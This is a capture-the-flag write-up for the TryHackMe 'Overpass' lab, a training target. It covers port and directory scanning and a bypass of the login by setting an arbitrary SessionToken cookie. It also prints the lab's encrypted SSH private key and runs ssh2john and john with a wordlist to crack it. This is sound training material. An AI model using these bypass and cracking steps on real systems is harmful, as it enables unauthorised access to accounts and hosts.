href=https://tryhackme.com/room/overpass>https://tryhackme.com/room/overpass</a><br>Creator: <a href=https://tryhackme.com/p/NinjaJc01>NinjaJc01</a><br><br>Host: 10.10.219.14</p><hr><h3 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h3><p>Let&rsquo;s kick off with a fast <code>rustscan</code> against the host.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Overpass<span style=color:#f92672>]</span>
‚îî‚îÄ# rustscan -a 10.10.219.14 --ulimit <span style=color:#ae81ff>5000</span> -b <span style=color:#ae81ff>4500</span> -- -sC -sV
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.üê¢

<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> The config file is expected to be at <span style=color:#e6db74>&#34;/root/.rustscan.toml&#34;</span>
<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Automatically increasing ulimit value to 5000.
Open 10.10.219.14:22
Open 10.10.219.14:80

...

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl <span style=color:#ae81ff>60</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
|   <span style=color:#ae81ff>256</span> 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU<span style=color:#f92672>=</span>
|   <span style=color:#ae81ff>256</span> 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
80/tcp open  http    syn-ack ttl <span style=color:#ae81ff>60</span> Golang net/http server <span style=color:#f92672>(</span>Go-IPFS json-rpc or InfluxDB API<span style=color:#f92672>)</span>
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...
</code></pre></div><h3 id=port-80---http>Port 80 - HTTP<a hidden class=anchor aria-hidden=true href=#port-80---http>#</a></h3><p>Noice, the server looks custom, let&rsquo;s search if there&rsquo;s any <strong>public exploit</strong> for this <em>version/release</em>.</p><p>None, sad. Let&rsquo;s continue exploring the application. According to the box description, <em>some students created a free password manager</em> and we&rsquo;re supposed to exploit it.</p><p><img loading=lazy src=/images/overpass-thm/Untitled.png alt></p><p>‚Äî</p><p>Downloading the <code>(.go) file</code>, we get the source code of the application:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>

<span style=color:#f92672>import</span> (
	<span style=color:#e6db74>&#34;bufio&#34;</span>
	<span style=color:#e6db74>&#34;encoding/json&#34;</span>
	<span style=color:#e6db74>&#34;fmt&#34;</span>
	<span style=color:#e6db74>&#34;io/ioutil&#34;</span>
	<span style=color:#e6db74>&#34;os&#34;</span>
	<span style=color:#e6db74>&#34;strconv&#34;</span>
	<span style=color:#e6db74>&#34;strings&#34;</span>

	<span style=color:#e6db74>&#34;github.com/mitchellh/go-homedir&#34;</span>
)

<span style=color:#66d9ef>type</span> <span style=color:#a6e22e>passListEntry</span> <span style=color:#66d9ef>struct</span> {
	<span style=color:#a6e22e>Name</span> <span style=color:#66d9ef>string</span> <span style=color:#e6db74>`json:&#34;name&#34;`</span>
	<span style=color:#a6e22e>Pass</span> <span style=color:#66d9ef>string</span> <span style=color:#e6db74>`json:&#34;pass&#34;`</span>
}

<span style=color:#f92672>...</span>
</code></pre></div><br><p>Running <code>gobuster</code> we can see a hidden directory <code>/admin</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Overpass<span style=color:#f92672>]</span>
‚îî‚îÄ# gobuster dir -u http://10.10.219.14 -w /usr/share/wordlists/dirb/common.txt -k -e -b <span style=color:#ae81ff>404</span> -t 100
<span style=color:#f92672>===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
<span style=color:#f92672>===============================================================</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.219.14
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>100</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Expanded:                true
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
<span style=color:#f92672>===============================================================</span>
2021/04/20 13:00:30 Starting gobuster in directory enumeration mode
<span style=color:#f92672>===============================================================</span>
http://10.10.219.14/aboutus              <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; aboutus/<span style=color:#f92672>]</span>
http://10.10.219.14/admin                <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 42<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; /admin/<span style=color:#f92672>]</span>
http://10.10.219.14/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; css/<span style=color:#f92672>]</span>    
http://10.10.219.14/downloads            <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; downloads/<span style=color:#f92672>]</span>
http://10.10.219.14/img                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; img/<span style=color:#f92672>]</span>      
http://10.10.219.14/index.html           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; ./<span style=color:#f92672>]</span>        
                                                                                  
<span style=color:#f92672>===============================================================</span>
2021/04/20 13:00:40 Finished
<span style=color:#f92672>===============================================================</span>
</code></pre></div><br><p>Rerunning <code>gobuster</code> with <em>an</em> <em>extensive list of extensions</em> with <code>common.txt</code> we get some <code>.js</code> files (those are also loaded when <code>/admin</code> is visited)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Overpass<span style=color:#f92672>]</span>
‚îî‚îÄ# gobuster dir -u http://10.10.219.14 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404,403 -t <span style=color:#ae81ff>100</span> -x php,jsp,rb,py,js,asp,aspx,zip,sql,tar,txt,key,doc,docx,html,jar,groovy,back,xml,ini,inc,config,json,yml,conf,cgi
<span style=color:#f92672>===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
<span style=color:#f92672>===============================================================</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.219.14
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>100</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   403,404
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              aspx,jar,php,py,sql,tar,txt,html,ini,inc,rb,asp,zip,doc,docx,groovy,config,yml,conf,jsp,js,key,back,xml,json,cgi
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Expanded:                true
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
<span style=color:#f92672>===============================================================</span>
2021/04/20 13:07:31 Starting gobuster in directory enumeration mode
<span style=color:#f92672>===============================================================</span>
http://10.10.219.14/aboutus              <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; aboutus/<span style=color:#f92672>]</span>
http://10.10.219.14/admin                <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 42<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; /admin/<span style=color:#f92672>]</span>
http://10.10.219.14/404.html             <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 782<span style=color:#f92672>]</span>             
http://10.10.219.14/admin.html           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 1525<span style=color:#f92672>]</span>            
http://10.10.219.14/cookie.js            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 1502<span style=color:#f92672>]</span>            
http://10.10.219.14/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; css/<span style=color:#f92672>]</span>    
http://10.10.219.14/downloads            <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; downloads/<span style=color:#f92672>]</span>
http://10.10.219.14/img                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; img/<span style=color:#f92672>]</span>      
http://10.10.219.14/index.html           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; ./<span style=color:#f92672>]</span>        
http://10.10.219.14/index.html           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; ./<span style=color:#f92672>]</span>        
http://10.10.219.14/login.js             <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 1779<span style=color:#f92672>]</span>              
http://10.10.219.14/main.js              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 28<span style=color:#f92672>]</span>                
                                                                                 
<span style=color:#f92672>===============================================================</span>
2021/04/20 13:11:38 Finished
<span style=color:#f92672>===============================================================</span>
</code></pre></div><br><p>The contents of the .js files include:</p><p><a href=http://10.10.219.14/cookie.js>cookie.js</a> (beautified)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=color:#75715e>/*! js-cookie v3.0.0-beta.4 | MIT */</span> <span style=color:#f92672>!</span> <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>e</span>, <span style=color:#a6e22e>t</span>) {
    <span style=color:#e6db74>&#34;object&#34;</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>typeof</span> <span style=color:#a6e22e>exports</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#e6db74>&#34;undefined&#34;</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>typeof</span> <span style=color:#a6e22e>module</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>() <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;function&#34;</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>typeof</span> <span style=color:#a6e22e>define</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>define</span>.<span style=color:#a6e22e>amd</span> <span style=color:#f92672>?</span> <span style=color:#a6e22e>define</span>(<span style=color:#a6e22e>t</span>) <span style=color:#f92672>:</span> (<span style=color:#a6e22e>e</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>e</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>self</span>, <span style=color:#66d9ef>function</span>() {
        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>r</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>e</span>.<span style=color:#a6e22e>Cookies</span>,
            <span style=color:#a6e22e>n</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>e</span>.<span style=color:#a6e22e>Cookies</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>();
        <span style=color:#a6e22e>n</span>.<span style=color:#a6e22e>noConflict</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>() {
            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>e</span>.<span style=color:#a6e22e>Cookies</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>r</span>, <span style=color:#a6e22e>n</span>
        }
    }())
}(<span style=color:#66d9ef>this</span>, <span style=color:#66d9ef>function</span>() {
    <span style=color:#e6db74>&#34;use strict&#34;</span>;

...
</code></pre></div><br><p><a href=http://10.10.219.14/login.js>login.js</a></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>postData</span>(<span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> {}) {
    <span style=color:#75715e>// Default options are marked with *
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>response</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#a6e22e>url</span>, {
        <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#75715e>// *GET, POST, PUT, DELETE, etc.
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>cache</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;no-cache&#39;</span>, <span style=color:#75715e>// *default, no-cache, reload, force-cache, only-if-cached
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>credentials</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;same-origin&#39;</span>, <span style=color:#75715e>// include, *same-origin, omit
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>headers</span><span style=color:#f92672>:</span> {
            <span style=color:#e6db74>&#39;Content-Type&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;application/x-www-form-urlencoded&#39;</span>
        },
        <span style=color:#a6e22e>redirect</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;follow&#39;</span>, <span style=color:#75715e>// manual, *follow, error
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>referrerPolicy</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;no-referrer&#39;</span>, <span style=color:#75715e>// no-referrer, *client
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>body</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>encodeFormData</span>(<span style=color:#a6e22e>data</span>) <span style=color:#75715e>// body data type must match &#34;Content-Type&#34; header
</span><span style=color:#75715e></span>    });
    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>response</span>; <span style=color:#75715e>// We don&#39;t always want JSON back
</span><span style=color:#75715e></span>}
<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>encodeFormData</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>data</span>) =&gt; {
    <span style=color:#66d9ef>return</span> Object.<span style=color:#a6e22e>keys</span>(<span style=color:#a6e22e>data</span>)
        .<span style=color:#a6e22e>map</span>(<span style=color:#a6e22e>key</span> =&gt; encodeURIComponent(<span style=color:#a6e22e>key</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;=&#39;</span> <span style=color:#f92672>+</span> encodeURIComponent(<span style=color:#a6e22e>data</span>[<span style=color:#a6e22e>key</span>]))
        .<span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#39;&amp;&#39;</span>);
}
<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>onLoad</span>() {
    document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;#loginForm&#34;</span>).<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;submit&#34;</span>, <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
        <span style=color:#75715e>//on pressing enter
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>preventDefault</span>()
        <span style=color:#a6e22e>login</span>()
    });
}
<span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>login</span>() {
    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>usernameBox</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;#username&#34;</span>);
    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>passwordBox</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;#password&#34;</span>);
    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>loginStatus</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;#loginStatus&#34;</span>);
    <span style=color:#a6e22e>loginStatus</span>.<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>creds</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>usernameBox</span>.<span style=color:#a6e22e>value</span>, <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>passwordBox</span>.<span style=color:#a6e22e>value</span> }
    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>response</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>postData</span>(<span style=color:#e6db74>&#34;/api/login&#34;</span>, <span style=color:#a6e22e>creds</span>)
    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>statusOrCookie</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>text</span>()
    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>statusOrCookie</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;Incorrect credentials&#34;</span>) {
        <span style=color:#a6e22e>loginStatus</span>.<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Incorrect Credentials&#34;</span>
        <span style=color:#a6e22e>passwordBox</span>.<span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>
    } <span style=color:#66d9ef>else</span> {
        <span style=color:#a6e22e>Cookies</span>.<span style=color:#a6e22e>set</span>(<span style=color:#e6db74>&#34;SessionToken&#34;</span>,<span style=color:#a6e22e>statusOrCookie</span>)
        window.<span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/admin&#34;</span>
    }
}
</code></pre></div><br><p><a href=http://10.10.219.14/main.js>main.js</a></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Hello, World!&#34;</span>)
</code></pre></div><br><p>From going through the JS files, we can see that <code>login.js</code> is utilized when we try to <strong>login</strong> through <code>/admin</code> endpoint in the application. It sends a <code>POST</code> request to <code>/api/login</code> for logging in the user.</p><p>Based on the response, whatever it is, the cookies are set, we can call the object (<code>Cookies.set("SessionToken",statusOrCookie)</code>) and try to set it to anything we like.</p><p><strong>Setting the cookie:</strong></p><p><img loading=lazy src=/images/overpass-thm/Untitled%201.png alt></p><p><strong>Visiting page with it:</strong></p><p><img loading=lazy src=/images/overpass-thm/Untitled%202.png alt></p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>I tried setting it to <code>admin</code> or <code>administrator</code> or just nothing, it still worked. Weird, oh well, we&rsquo;ve bypassed the authentication!</p><p><strong>The page response looks like:</strong></p><p><img loading=lazy src=/images/overpass-thm/Untitled%203.png alt></p><p>Alright, we&rsquo;ve to <strong>crack the ssh key</strong> of user <code>James</code>. Let&rsquo;s grab and do it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)-[~/THM/Overpass]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> cat &gt; id_rsa.enc
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: <span style=color:#ae81ff>4</span>,ENCRYPTED
DEK-Info: AES-<span style=color:#ae81ff>128</span>-CBC,<span style=color:#ae81ff>9F85D92F34F42626F13</span>A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
<span style=color:#ae81ff>73</span>/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/<span style=color:#ae81ff>9</span>kvUiL3rhkBURhVIbj2qiHxR
<span style=color:#ae81ff>3</span>KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
<span style=color:#ae81ff>9</span>BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+<span style=color:#ae81ff>8</span>REgYirOGcZ
<span style=color:#ae81ff>4</span>TBApY+uz34JXe8jElhrKV9xw/<span style=color:#ae81ff>7</span>zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
<span style=color:#ae81ff>6</span>p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
<span style=color:#ae81ff>8</span>HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
<span style=color:#ae81ff>4F</span>Mg3ng0e4/<span style=color:#ae81ff>7</span>HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
<span style=color:#ae81ff>49</span>TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
<span style=color:#ae81ff>2</span>cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
</code></pre></div><br><p>Let&rsquo;s use <code>ssh2john</code> and convert it into a <em>format recognizable</em> by <code>john</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Overpass<span style=color:#f92672>]</span>
‚îî‚îÄ# ssh2john.py id_rsa.enc &gt; id_rsa.john
</code></pre></div><br><p>Let&rsquo;s get <strong>cracking</strong>!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>‚îå‚îÄ‚îÄ<span style=color:#f92672>(</span>rootüíÄb0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Overpass<span style=color:#f92672>]</span>
‚îî‚îÄ# john id_rsa.john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt                                                                                                                                               <span style=color:#ae81ff>1</span> ‚®Ø
Using default input encoding: UTF-8
Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>SSH <span style=color:#f92672>[</span>RSA/DSA/EC/OPENSSH <span style=color:#f92672>(</span>SSH private keys<span style=color:#f92672>)</span> 32/64<span style=color:#f92672>])</span>
